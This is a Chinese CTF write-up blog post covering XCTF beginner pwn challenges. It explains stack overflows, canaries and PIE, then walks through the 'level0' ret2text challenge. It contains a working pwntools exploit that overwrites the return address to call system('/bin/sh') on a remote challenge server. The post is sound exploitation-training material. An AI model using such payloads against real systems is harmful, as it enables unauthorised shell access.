<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="xctf攻防世界-pwn-新手村   image-20220603161727708  000新手村准备 栈缓冲区溢出原理 一些C语言函数在获取输入到缓冲区时不关心缓冲区大小和输入长度,只要有输入就一直往缓冲区写入数据,如果往一个只能容纳两个字符的缓冲区写入三个字符就会导致缓冲区溢出 比如这么一个程序 12345678910111213#include &lt;stdio.h&amp;g">
<meta property="og:type" content="article">
<meta property="og:title" content="xctf攻防世界-pwn-新手村">
<meta property="og:url" content="http://deutschball.github.io/2022/06/03/xctf-pwn-%E6%96%B0%E6%89%8B10%E9%A2%98/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="xctf攻防世界-pwn-新手村   image-20220603161727708  000新手村准备 栈缓冲区溢出原理 一些C语言函数在获取输入到缓冲区时不关心缓冲区大小和输入长度,只要有输入就一直往缓冲区写入数据,如果往一个只能容纳两个字符的缓冲区写入三个字符就会导致缓冲区溢出 比如这么一个程序 12345678910111213#include &lt;stdio.h&amp;g">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-06-03T08:16:00.000Z">
<meta property="article:modified_time" content="2022-10-03T08:43:53.169Z">
<meta property="article:author" content="dustball">
<meta property="article:tag" content="xctf攻防世界">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/2022/06/03/xctf-pwn-%E6%96%B0%E6%89%8B10%E9%A2%98/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>xctf攻防世界-pwn-新手村 | dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/03/xctf-pwn-%E6%96%B0%E6%89%8B10%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          xctf攻防世界-pwn-新手村
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-03 16:16:00" itemprop="dateCreated datePublished" datetime="2022-06-03T16:16:00+08:00">2022-06-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-03 16:43:53" itemprop="dateModified" datetime="2022-10-03T16:43:53+08:00">2022-10-03</time>
              </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="xctf攻防世界-pwn-新手村">xctf攻防世界-pwn-新手村</h1>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603161727708.png"
alt="image-20220603161727708" />
<figcaption aria-hidden="true">image-20220603161727708</figcaption>
</figure>
<h2 id="新手村准备">000新手村准备</h2>
<h3 id="栈缓冲区溢出原理">栈缓冲区溢出原理</h3>
<p>一些C语言函数在获取输入到缓冲区时不关心缓冲区大小和输入长度,只要有输入就一直往缓冲区写入数据,如果往一个只能容纳两个字符的缓冲区写入三个字符就会导致缓冲区溢出</p>
<p>比如这么一个程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> a=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>gcc main.c -fno-stack-protector -O0 -o main -g</code>编译</p>
<blockquote>
<p><code>-fno-stack-protector</code>不使用栈保护者(比如金丝雀)</p>
<p><code>-O0</code>不使用编译优化</p>
<p><code>-g</code>生成gdb调试信息,即创建<code>.debug</code>节</p>
<p><code>-o main</code>编译链接生成的程序改名为<code>main</code></p>
</blockquote>
<p>此时会报一个编译警告</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">warning: the `gets&#x27; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
<p>为什么说gets函数是危险的?因为他没有对输入的字符数和缓冲区大小进行检查,</p>
<p>使用<code>checksec</code>命令观察该程序使用的保护措施,发现<code>No canary found</code>即没有使用金丝雀</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511100355390.png"
alt="image-20220511100355390" />
<figcaption aria-hidden="true">image-20220511100355390</figcaption>
</figure>
<p>首先使用ida64打开程序观察一下func函数的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000010</span><br><span class="line">-0000000000000010                 db ? ; undefined			;后面开出的这一些是为了栈16字节对齐</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003 s               db 2 dup(?)</span><br><span class="line">-0000000000000001 a               db ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>返回地址在<code>rbp+0x8</code>,</p>
<p><code>char a</code>在<code>rbp-0x1</code></p>
<p><code>char s[2]</code> 数组在<code>rbp-0x3</code></p>
<p>栈是从高地址向低地址增长的,然后站内的局部变量是从低地址向高地址增长的,即如果输入s,第一个字符会放在<code>rbp-0x3</code>,第二个字符会放在<code>rbp-0x2</code>,此时缓冲区用完了,如果有第三个字符,则放在<code>0x01</code>而这里恰好是a变量的地址,因此如果输入2个以上字符则会破坏a变量</p>
<blockquote>
<p>注意这里char s[2]中的2关键,它就限制了s数组的大小是2字节.</p>
<p>char buffer[]="123456"和char buffer[10]="123456"两者的区别就是</p>
<p>前者buffer根据"123456"确定为6个字节,而后者buffer固定为10字节</p>
<p>缓冲区长度固定很重要,使我们可以计算缓冲区和返回地址的距离</p>
</blockquote>
<p>为了验证这个事情,我们用gdb调试器调试</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511091428527.png"
alt="image-20220511091428527" />
<figcaption aria-hidden="true">image-20220511091428527</figcaption>
</figure>
<p>在第七行和第八行分别下断点,运行之后程序停在第七行然后<code>continue</code>,接下来输入<code>bcd</code>作为<code>gets</code>的输入,按下<code>enter</code>之后程序停在第八行</p>
<p>此时<code>print a</code>发现a的值已经变成了<code>d</code></p>
<p>如果没有开启金丝雀保护,那么再使使劲输入点东西,可以溢出改变返回地址</p>
<h3 id="防御措施">防御措施</h3>
<h4 id="金丝雀canary">金丝雀canary</h4>
<p>同样的程序使用<code>gcc main.c -Og -o main -g</code>编译链接,相对于刚才的编译选项,这次没有<code>-fno-stack-protector</code>,默认使用栈保护者金丝雀</p>
<p>这次再使用<code>checksec</code>命令查看保护措施,发现<code>Canary found</code>即有金丝雀保护</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511100510166.png"
alt="image-20220511100510166" />
<figcaption aria-hidden="true">image-20220511100510166</figcaption>
</figure>
<p>用ida64查看反汇编,相对于没有金丝雀保护的程序,<code>func</code>函数这次多了一些东西</p>
<p><code>func</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...;开端</span><br><span class="line"></span><br><span class="line">.text:0000000000001192                 mov     ebx, 28h ; &#x27;(&#x27;			</span><br><span class="line">.text:0000000000001197                 mov     rax, fs:[rbx]			;fs段寄存器,偏移量28h处的一个四字搬进rax</span><br><span class="line">.text:000000000000119B                 mov     [rsp+18h+var_10], rax	;rax再搬进栈上var_10</span><br><span class="line"></span><br><span class="line">...;主要逻辑,中途rbx寄存器值不变</span><br><span class="line"></span><br><span class="line">.text:00000000000011B6                 mov     rax, [rsp+18h+var_10]	;栈上var_10搬出来给rax</span><br><span class="line">.text:00000000000011BB                 xor     rax, fs:[rbx]			;fs:[rbx]取出来和rax作比较</span><br><span class="line">.text:00000000000011BF                 jnz     short loc_11C7			;两者相同则说明var_10没有被修改过,否则溢出</span><br><span class="line"></span><br><span class="line">...尾声</span><br></pre></td></tr></table></figure>
<p><code>loc_11C7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011C7 loc_11C7:                               ; CODE XREF: func+36↑j</span><br><span class="line">.text:00000000000011C7                 call    ___stack_chk_fail						;报告错误</span><br><span class="line">.text:00000000000011C7 ; &#125; // starts at 1189</span><br><span class="line">.text:00000000000011C7 func            endp</span><br><span class="line">.text:00000000000011C7</span><br></pre></td></tr></table></figure>
<p>下面我们用gdb调试器动态观察一下<code>.text:0000000000001197                 mov     rax, fs:[rbx]</code>发生后,rax中存放的是什么</p>
<p>首先使用<code>gcc main.c -O0 -S</code>得到<code>main.s</code>然后使用<code>gcc -g main.s -o main</code>得到<code>main</code></p>
<p>然后<code>gdb -tui -q main</code>对汇编代码进行调试</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511110203468.png"
alt="image-20220511110203468" />
<figcaption aria-hidden="true">image-20220511110203468</figcaption>
</figure>
<p>如果此时我们输入3个以上字符然后继续执行</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511110350341.png"
alt="image-20220511110350341" />
<figcaption aria-hidden="true">image-20220511110350341</figcaption>
</figure>
<p>再从栈中取出<code>-8(%rbp)</code>到rax中时,值已经被改变</p>
<p>异或运算之后打印eflag寄存器观察ZF标志位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eflags         0x206               [ PF IF ]</span><br></pre></td></tr></table></figure>
<p>发现ZF为0即刚才运算结果不为0,不会跳转<code>je .L3</code>,而是顺序执行<code>call  __stack_chk_fail@PLT</code></p>
<p>每次运行程序的时候<code>fs:28h</code>上的值都不同,即通过猜测金丝雀值进行绕过也是不太可能的</p>
<h4 id="pie">PIE</h4>
<blockquote>
<p>PIE全称是position-independent
executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题</p>
</blockquote>
<p>如果不使用PIE保护则每次进程的虚拟地址空间都是不变的</p>
<p>比如<code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,&amp;func);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开启PIE保护时</p>
<p>低12个二进制位不变但是高位会变</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# gcc  main.c -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x55eebe8f7139</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x561135f2c139</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x556dca0ef139</span><br></pre></td></tr></table></figure>
<p>不开启PIE保护时</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# gcc -fno-stack-protector -no-pie main.c -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x401126</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x401126</span><br></pre></td></tr></table></figure>
<p>func的地址就恒为<code>0x401126</code>不变了</p>
<h2 id="level0">001level0</h2>
<p>ret2text(return to text)返回.text节的函数</p>
<p>目的是getshell,</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwn/level0# checksec --file=level0</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols     No       0               1       level0</span><br></pre></td></tr></table></figure>
<p>只有一个<code>NX</code>保护,没有金丝雀保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);			<span class="comment">//系统调用,向标准输出 输出&quot;Hello,World\n&quot;,最多输出0xD=13个字符</span></span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();					<span class="comment">//返回vulnerable_function的返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数就直接叫<code>vulnerable_function</code>生怕人家不知道他虚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF	//128字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);			<span class="comment">//系统调用,从标准输入获取至多0x200=512字节,写入buf缓冲区</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>read(0, buf, 0x200uLL);</code>可以获取比缓冲区大很多的输入,这里存在栈缓冲区溢出,那么怎么利用呢</p>
<p>如果使用ret2text的方法,只需要再在<code>.text</code>节找一个能够执行shell的函数,然后将其开始溢出到<code>vulnerable_function</code>函数的栈返回值位置</p>
<blockquote>
<p><code>vulnerable_function</code>的栈帧:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000080 buf             db 128 dup(?)</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>前128+8个字符无用,第136个字符开始的八个字节存放的是该函数的返回地址</p>
</blockquote>
<p>考虑ret2text方法,找一下有没有text节中可以调用shell的函数,可以通过ctrl+1然后观察Strings视图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511160139521.png"
alt="image-20220511160139521" />
<figcaption aria-hidden="true">image-20220511160139521</figcaption>
</figure>
<p>发现有这么一个<code>/bin/sh</code>也是shell的一种,双击观察</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511160213620.png"
alt="image-20220511160213620" />
<figcaption aria-hidden="true">image-20220511160213620</figcaption>
</figure>
<p>从交叉引用注释发现<code>'/bin/sh'</code>被callsystem函数调用,双击该交叉引用跳转到该函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596 ; Attributes: bp-based frame	</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596 ; __unwind &#123;</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;	;/bin/sh作为参数压栈</span><br><span class="line">.text:000000000040059F                 call    _system				;调用system()函数,执行shell命令</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 ; &#125; // starts at 400596</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure>
<p>该函数就干了一件事<code>system("/bin/sh")</code>,该函数起始地址<code>0x400596</code></p>
<p><del>可笑的是,主函数相关的调用链上并没有该函数,即该函数写了白写并且还能和栈缓冲区溢出一起成为内鬼</del></p>
<p>下面需要做到就是在<code>vulnerable_function</code>中read获取输入的时候将前136个字符乱写一气,然后接下来的八个字节写入<code>0x400596</code>,当<code>vulnerable_function</code>返回时,程序计数器PC获取其栈中保存的返回地址从<code>0x400596</code>即<code>callsystem</code>函数的起始位置开始执行,诚如是,则shell得矣</p>
<h3 id="exp">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接到111.200.241.244:58761</span></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;58761&#x27;</span>)		</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造负载,前0x88个字符随便写,不妨都写&#x27;a&#x27;,接下来八个字节要写0x00 40 05 96,而这显然不是ASCII码 可打印字符 能办到的</span></span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>).encode()+p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#向远程主机发送payload</span></span><br><span class="line">sh.sendline( payload )</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立交互式shell</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>p64函数干了啥?package 64位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="string">b&#x27;\x96\x05@\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将参数按照小端模式转化成有8个字符的字符串,其中可打印的ascii字符比如@就直接用字符表示,否则用<code>\x XX</code>这种形式表示</p>
<p>p32函数会干啥?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x400596</span>)</span><br><span class="line"><span class="string">b&#x27;\x96\x05@\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将参数按照小端模式转化成有4个字符的字符串,其中可打印的ascii字符比如@就直接用字符表示,否则用<code>\x XX</code>这种形式表示</p>
